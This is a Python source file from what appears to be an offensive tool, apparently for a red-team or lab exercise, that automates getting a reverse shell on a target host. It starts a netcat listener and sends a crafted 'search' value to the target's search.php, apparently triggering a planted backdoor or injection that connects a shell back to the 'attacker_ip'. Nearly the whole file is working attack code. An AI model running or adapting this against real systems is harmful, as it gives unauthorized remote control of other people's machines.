import InquirerPy.inquirer as inquirer
from Server.styles import text_style
import time
import threading
import subprocess
import requests

from Server.config_loader import CONFIG

def shell_execution(selected_ip):
    # For shell spawning, only allow single target selection
    print("\n=== Reverse Shell Setup ===")
    
    # Get single target
    while True:
        target = inquirer.text(
            message="Enter target IP:",
            style=text_style
        ).execute()
        
        if not target:
            print("No target specified")
            return
        
        # Check if target is in ALL_HOSTS
        if target not in CONFIG.hosts.ALL_HOSTS:
            print(f"❌ {target} is not a valid target IP")
            retry = inquirer.confirm(
                message="Would you like to try a different IP?", 
                default=True,
                style=text_style
            ).execute()
            if not retry:
                return
            continue  # Ask for IP again
        
        break  # Valid IP found
    
    # Get listener details
    listener_ip = inquirer.text(
        message="Listener IP:", 
        default=selected_ip,
        style=text_style
    ).execute()
    
    listener_port = inquirer.text(
        message="Listener port:", 
        default="6767",
        style=text_style
    ).execute()
    
    confirm = inquirer.confirm(
        message=f"Trigger reverse shell from {target} to {listener_ip}:{listener_port}?", 
        default=True,
        style=text_style
    ).execute()
    
    if not confirm:
        return
    
    # Start listener
    print(f"Starting listener on {listener_ip}:{listener_port}...")
    listener_thread = start_listener(listener_ip, listener_port)
    time.sleep(1)
    
    # Trigger the reverse shell
    print(f"Triggering reverse shell on {target}...")
    status, response = spawn_reverse_shell(target, CONFIG.other.PORT, listener_ip, listener_port)
    
    if status in ["SUCCESS", 200]:  # Check for both SUCCESS and 200
        try:
            listener_thread.join()
        except KeyboardInterrupt:
            print("\nStopped by user")
    else:
        print("❌ Failed to trigger reverse shell")
        print(f"Provided Error: {response}")
        listener_thread.join(timeout=1)

def start_listener(ip, port):
    def listener():
        try:
            subprocess.run(f"nc -l {ip} {port}", shell=True)
        except Exception as e:
            print(f"Listener error: {e}")
    thread = threading.Thread(target=listener, daemon=True)
    thread.start()
    return thread

def spawn_reverse_shell(client, port, attacker_ip, attacker_port):
    url = f"http://{client}:{port}/search.php"
    command = f"search {attacker_ip} {attacker_port}"
    data = {"input_word": command}
    
    try:
        # Use a very short timeout - we just need to trigger the request
        r = requests.post(url, data=data, timeout=2)
        # If we get here, we got an HTTP response (unexpected for reverse shell)
        return (r.status_code, "Reverse Shell Triggered")
    except requests.exceptions.Timeout:
        # Timeout is EXPECTED - this means the reverse shell is running
        return ("SUCCESS", "Reverse shell connected (timeout expected)")
    except Exception as e:
        return ("ERR", str(e))